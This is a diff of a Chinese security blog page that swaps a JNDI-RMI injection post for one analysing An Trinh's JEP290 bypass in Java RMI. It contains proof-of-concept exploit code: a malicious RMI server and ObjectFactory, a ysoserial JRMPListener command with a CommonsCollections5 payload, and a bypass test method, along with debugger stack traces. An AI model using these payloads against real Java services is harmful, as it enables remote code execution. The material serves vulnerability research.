@@ -6,27 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://m0d9.me">
-  <title>JNDI：JNDI-RMI 注入及绕过JDK高版本限制 | m0d9&#39;s blog</title>
+  <title>RMI：绕过JEP290——下 | m0d9&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="fastjson 配合jndi注入攻击，现在已经是很常见的姿势了。前文RMI 1中略微提到jndi-rmi 攻击client的思路，这里详细补充下。 其实JNDI-RMI注入的核心是JNDI注入，RMI协议只是jndi支持的其中一种，其他还有很多。这里不做深入JNDI安全背景解释，只是因为和RMI略有关系，所以作为RMI系列只是简要跟进分析下。">
+  <meta name="description" content="前文留了个坑，8u231之后还出现了限制与绕过，填个坑 本节的思路：  回顾JEP290 bypass的原理 8u231的限制，老的JRMP绕过方式为何不行了 An Trinh的绕过方式 8u241的限制">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JNDI：JNDI-RMI 注入及绕过JDK高版本限制">
-<meta property="og:url" content="http://m0d9.me/2020/07/11/JNDI%EF%BC%9AJNDI-RMI%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6/index.html">
+<meta property="og:title" content="RMI：绕过JEP290——下">
+<meta property="og:url" content="http://m0d9.me/2020/07/15/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8B/index.html">
 <meta property="og:site_name" content="m0d9&#39;s blog">
-<meta property="og:description" content="fastjson 配合jndi注入攻击，现在已经是很常见的姿势了。前文RMI 1中略微提到jndi-rmi 攻击client的思路，这里详细补充下。 其实JNDI-RMI注入的核心是JNDI注入，RMI协议只是jndi支持的其中一种，其他还有很多。这里不做深入JNDI安全背景解释，只是因为和RMI略有关系，所以作为RMI系列只是简要跟进分析下。">
+<meta property="og:description" content="前文留了个坑，8u231之后还出现了限制与绕过，填个坑 本节的思路：  回顾JEP290 bypass的原理 8u231的限制，老的JRMP绕过方式为何不行了 An Trinh的绕过方式 8u241的限制">
 <meta property="og:locale">
-<meta property="og:image" content="http://m0d9.me/images/pasted-34.png">
-<meta property="og:image" content="http://m0d9.me/images/pasted-38.png">
-<meta property="og:image" content="http://m0d9.me/images/pasted-39.png">
-<meta property="og:image" content="http://m0d9.me/images/pasted-40.png">
-<meta property="article:published_time" content="2020-07-11T12:47:00.000Z">
-<meta property="article:modified_time" content="2020-10-10T13:20:18.826Z">
+<meta property="og:image" content="http://m0d9.me/images/pasted-96.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-97.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-100.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-102.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-103.png">
+<meta property="article:published_time" content="2020-07-15T03:52:00.000Z">
+<meta property="article:modified_time" content="2021-10-27T07:53:37.075Z">
 <meta property="article:author" content="m0d9">
 <meta property="article:tag" content="Java">
-<meta property="article:tag" content="JNDI">
 <meta property="article:tag" content="RMI">
+<meta property="article:tag" content="JEP290">
+<meta property="article:tag" content="enableReplace">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://m0d9.me/images/pasted-34.png">
+<meta name="twitter:image" content="http://m0d9.me/images/pasted-96.png">
   
     <link rel="alternative" href="/atom.xml" title="m0d9&#39;s blog" type="application/atom+xml">
   
@@ -181,139 +183,170 @@ ga('send', 'pageview');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-JNDI：JNDI-RMI 注入及绕过JDK高版本限制" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-RMI：绕过JEP290——下" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      JNDI：JNDI-RMI 注入及绕过JDK高版本限制
+      RMI：绕过JEP290——下
     </h1>
   
 
         
-        <a href="/2020/07/11/JNDI%EF%BC%9AJNDI-RMI%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6/" class="archive-article-date">
-  	<time datetime="2020-07-11T12:47:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-11</time>
+        <a href="/2020/07/15/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8B/" class="archive-article-date">
+  	<time datetime="2020-07-15T03:52:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>fastjson 配合jndi注入攻击，现在已经是很常见的姿势了。前文RMI 1中略微提到jndi-rmi 攻击client的思路，这里详细补充下。</p>
-<p>其实JNDI-RMI注入的核心是JNDI注入，RMI协议只是jndi支持的其中一种，其他还有很多。这里不做深入JNDI安全背景解释，只是因为和RMI略有关系，所以作为RMI系列只是简要跟进分析下。</p>
+        <p>前文留了个坑，8u231之后还出现了限制与绕过，填个坑</p>
+<p>本节的思路：</p>
+<ol>
+<li>回顾JEP290 bypass的原理</li>
+<li>8u231的限制，老的JRMP绕过方式为何不行了</li>
+<li>An Trinh的绕过方式</li>
+<li>8u241的限制</li>
+</ol>
 <a id="more"></a>
 
 
-<h2 id="JNDI-RMI-注入"><a href="#JNDI-RMI-注入" class="headerlink" title="JNDI-RMI 注入"></a>JNDI-RMI 注入</h2><p>《RMI：绕过JEP290（二）》，还是在围绕RMI的远程类加载（RMI Class Loading）方式，绕过java.rmi.server.codebase限制。</p>
-<p>JNDI-RMI 针对攻击RMI client的一种攻击方式，原理不同，参考【1】，解释得很明白了</p>
-<blockquote>
-<p>攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类，但是原理上并非使用RMI Class Loading机制的，因此不受 java.rmi.server.useCodebaseOnly 系统属性的限制，相对来说更加通用。</p>
-</blockquote>
-<h3 id="SHOW-ME-THE-CODE"><a href="#SHOW-ME-THE-CODE" class="headerlink" title="SHOW ME THE CODE"></a>SHOW ME THE CODE</h3><p>Evil Server</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.logCalls&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">                <span class="string">&quot;http://localhost:8080/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>HTTP Codebase Server</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">└── Exploit.class</span><br><span class="line">$ python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>
-
-<p>Exploit</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>vuln Client</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">Object local_obj = ctx.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>能够被利用的原理前文也提及：<strong>远程恶意类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，JNDI client加载时会执行这部分代码。</strong></p>
-<h3 id="与RMI远程调用的区别"><a href="#与RMI远程调用的区别" class="headerlink" title="与RMI远程调用的区别"></a>与RMI远程调用的区别</h3><p>bind</p>
+<h2 id="JEP290-JRMP绕过原理"><a href="#JEP290-JRMP绕过原理" class="headerlink" title="JEP290 JRMP绕过原理"></a>JEP290 JRMP绕过原理</h2><p>回顾前文讲过，绕过JEP290的原理如下：</p>
+<ol>
+<li>利用JEP290白名单内的类，建立JRMP连接，覆盖掉registerRefs</li>
+<li>Registry 处理bind请求，最后会触发DGC逻辑，DGC向registerRefs里保存的Server发送dirty请求</li>
+<li>DGC底层使用的是StreamRemoteCall.executeCall进行io的传输，executeCall发送完之后，会根据对方的反馈进行不同的操作，当对方返回一定条件时（初步判断是对方RMI Exception），会直接序列化InputStream，造成反序列化漏洞</li>
+</ol>
+<p>但是8u231中已经对此做了限制</p>
+<h3 id="8u231限制"><a href="#8u231限制" class="headerlink" title="8u231限制"></a>8u231限制</h3><p>详情可以参考【1】，讲的很详细，不赘述</p>
+<p>这里直接给出<strong>重点结论</strong></p>
 <ul>
-<li>RMI 绑定 继承UnicastRemoteObject类（最基础类可能不是这一个，没深入研究）</li>
-<li>JNDI 绑定的是javax.naming.Reference（Java Naming and Directory Interface,Java命名和目录接口），然后通过ReferenceWrapper包装成RMI可支持的object</li>
+<li>sun.rmi.registry.RegistryImpl_Skel#dispatch报错情况消除ref</li>
+<li>sun.rmi.transport.DGCImpl_Stub#dirty提前了黑名单</li>
 </ul>
-<p>call lookup</p>
+<p><img src="/images/pasted-96.png" alt="upload successful"></p>
+<p><img src="/images/pasted-97.png" alt="upload successful"></p>
+<h3 id="An-Trinh的RMI注册端的Bypass方法"><a href="#An-Trinh的RMI注册端的Bypass方法" class="headerlink" title="An Trinh的RMI注册端的Bypass方法"></a>An Trinh的RMI注册端的Bypass方法</h3><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>直接参考【1】ysomap中的poc</p>
+<ol>
+<li><p>Start Evil Registry</p>
+<p> <code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 &quot;open -a  calculator.app&quot;</code></p>
+</li>
+<li><p>Start Vuln Registry</p>
+<p> 启动helloRegistry</p>
+</li>
+<li><p>启动 ysomap/core/exploit/rmi/NamingTest.java</p>
+</li>
+</ol>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>同样在cc链上下断点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">readObject:150, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">... </span><br><span class="line">cc5</span><br><span class="line">...</span><br><span class="line">executeCall:270, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:161, UnicastRef (sun.rmi.server)</span><br><span class="line">invokeRemoteMethod:227, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">invoke:179, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">createServerSocket:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">newServerSocket:666, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">listen:335, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:254, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:411, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:147, LiveRef (sun.rmi.transport)</span><br><span class="line">exportObject:237, UnicastServerRef (sun.rmi.server)</span><br><span class="line">exportObject:383, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">exportObject:346, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">reexport:268, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">readObject:235, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect) [1]</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">dispatch:122, RegistryImpl_Skel (sun.rmi.registry)</span><br><span class="line">oldDispatch:469, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:301, UnicastServerRef (sun.rmi.server)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>先来看看两次payload的区别</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test_bypass_jep290_plus</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 1. 建立RMI连接</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 2. UnicastRef</span></span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10999</span>);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.1 原jep290 的代理类</span></span><br><span class="line">        <span class="comment">// RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span></span><br><span class="line">        <span class="comment">// Registry proxy = (Registry) Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]&#123;Registry.class&#125;, obj);</span></span><br><span class="line">        <span class="comment">// registry.bind(&quot;hello&quot;, proxy);</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.2 An Trinh jep290 bypass的代理类</span></span><br><span class="line">        RemoteObjectInvocationHandler handler = <span class="keyword">new</span> RemoteObjectInvocationHandler((RemoteRef) ref);</span><br><span class="line">        RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">                RMIServerSocketFactory.class.getClassLoader(),<span class="comment">// classloader</span></span><br><span class="line">                <span class="keyword">new</span> Class[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, <span class="comment">// interfaces to implements</span></span><br><span class="line">                handler<span class="comment">// RemoteObjectInvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// UnicastRemoteObject constructor is protected. It needs to use reflections to new a object</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="keyword">null</span>); <span class="comment">// 获取默认的</span></span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(<span class="keyword">null</span>);</span><br><span class="line">		<span class="comment">// 通过反射设置remoteObject ssf属性</span></span><br><span class="line">        ReflectionHelper.setFieldValue(remoteObject, <span class="string">&quot;ssf&quot;</span>, serverSocketFactory);</span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 修改之后的lookup</span></span><br><span class="line">        Naming.lookup(registry, remoteObject);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟踪调试下来发现参考【1】讲解的很详细了，需要仔细阅读，没什么多的好讲的，原文涉及到的就不赘述，啰嗦下自己的理解，重要的记录下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原JEP290实际上 序列化代码反序列化过程中 并未建立JRMP连接，只是覆盖了incomingRefTable，从而影响了DGC流程触发漏洞；而An Trinh的攻击思路是 直接在反序列化的时候，建立JRMP连接，触发UnicastRef底层StreamRemoteCall的处理异常逻辑(之后还是会走原JEP290覆盖incomingRefTable的流程)。</span><br></pre></td></tr></table></figure>
+
+<p>这个调用栈很关键</p>
+<p><img src="/images/pasted-100.png" alt="upload successful"></p>
+<p>跟踪下调用栈</p>
+<ol>
+<li>UnicastRemoteObject.readObject</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    reexport();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reexport</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (csf == <span class="keyword">null</span> &amp;&amp; ssf == <span class="keyword">null</span>) &#123;</span><br><span class="line">        exportObject((Remote) <span class="keyword">this</span>, port);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        exportObject((Remote) <span class="keyword">this</span>, port, csf, ssf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<pre><code>此时的ssf为 serverSocketFactory，值为Proxy[RMIServerSocketFactory,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[127.0.0.1:10999](remote),objID:[0:0:0, 534121287]]]]]</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">exportObject</span><span class="params">(Remote obj, <span class="keyword">int</span> port,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  RMIClientSocketFactory csf,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  RMIServerSocketFactory ssf)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> UnicastServerRef2(port, csf, ssf));</span><br><span class="line">&#125;</span><br><span class="line"> 	</span><br><span class="line"><span class="comment">// sun.rmi.server.UnicastServerRef2.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">UnicastServerRef2</span><span class="params">(<span class="keyword">int</span> var1, RMIClientSocketFactory var2, RMIServerSocketFactory var3)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(<span class="keyword">new</span> LiveRef(var1, var2, var3));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<pre><code>注意到此时obj属性ref被值为sref，sref=UnicastServerRef(new LiveRef(port=0, csf=null, ssf=serverSocketFactory))。
+
+是不是很类似原poc中构造UnicastRef的部分</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10999</span>);</span><br><span class="line">UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-102.png" alt="upload successful"></p>
+<ol start="2">
+<li>UnicastServerRef/LiveRef/TCPEndpoint/TCPTransport</li>
+</ol>
+<p>这个过程比较简单</p>
+<p>UnicastServerRef$exportObject</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Target var6 = <span class="keyword">new</span> Target(var1, <span class="keyword">this</span>, var5, <span class="keyword">this</span>.ref.getObjID(), var3);</span><br><span class="line"><span class="keyword">this</span>.ref.exportObject(var6);</span><br></pre></td></tr></table></figure>
+
+<pre><code>其中this.ref为上面的LiveRef，var5为Proxy[Remote,RemoteObjectInvocationHandler[UnicastRef2 [liveRef: [endpoint:[localhost:0,Proxy[RMIServerSocketFactory,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[127.0.0.1:10999](remote),objID:[0:0:0, 534121287]]]]]](local),objID:[-e331dff:173958b39d9:-7ffe, -3106094860174826018]]]]]</code></pre>
+<p>LiveRef$exportObject</p>
+<p><img src="/images/pasted-103.png" alt="upload successful"></p>
+<p>接下来没什么重要的，直到建立TCP连接并监听</p>
+<ol start="3">
+<li>TCPEndpoint$newServerSocket</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(<span class="keyword">this</span>.listenPort);</span><br></pre></td></tr></table></figure>
+<pre><code>这里需要注意的是，var1为前文的代理，值为上文的serverSocketFactory，具体值为Proxy[RMIServerSocketFactory,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[127.0.0.1:10999](remote),objID:[0:0:0, 534121287]]]]]
+
+serverSocketFactory.所有方法（当让包括createServerSocket）动态代理到RemoteObjectInvoationhandler的invoke，对应POC处的代码</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">            RMIServerSocketFactory.class.getClassLoader(),<span class="comment">// classloader</span></span><br><span class="line">            <span class="keyword">new</span> Class[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, <span class="comment">// interfaces to implements</span></span><br><span class="line">            handler<span class="comment">// RemoteObjectInvocationHandler</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<p>所以下一步是会是</p>
+<p>RemoteObjectInvocationHandler$invoke</p>
+<p>RemoteObjectInvocationHandler$invokeRemoteMethod</p>
+<ol start="3">
+<li>RemoteObjectInvocationHandler$invokeRemoteMethod</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private Object invokeRemoteMethod(Object proxy,</span><br><span class="line">                                  Method method,</span><br><span class="line">                                  Object[] args)</span><br><span class="line">    throws Exception</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (!(proxy instanceof Remote)) &#123;</span><br><span class="line">            throw new IllegalArgumentException(</span><br><span class="line">                &quot;proxy not Remote instance&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                          getMethodHash(method));</span><br></pre></td></tr></table></figure>
+
+<p>UnicastRef$invoke</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var7.executeCall();</span><br></pre></td></tr></table></figure>
+
+<p>这里和原JEP290的就不一样的，虽然都有用到这个类，但是原来的调用链用到的是UnicastRef$readExternal，这里就不一样了，executeCall会进入到StreamRemoteCall.executeCall流程，也就是前文的经常提及的触发点。</p>
+<h4 id="如何发送序列化Payload"><a href="#如何发送序列化Payload" class="headerlink" title="如何发送序列化Payload"></a>如何发送序列化Payload</h4><p>前文的test_bypass_jep290_plus 中构造了可利用的remoteObject，没有提及如何发送给Vuln Registry，为了简化直接使用的</p>
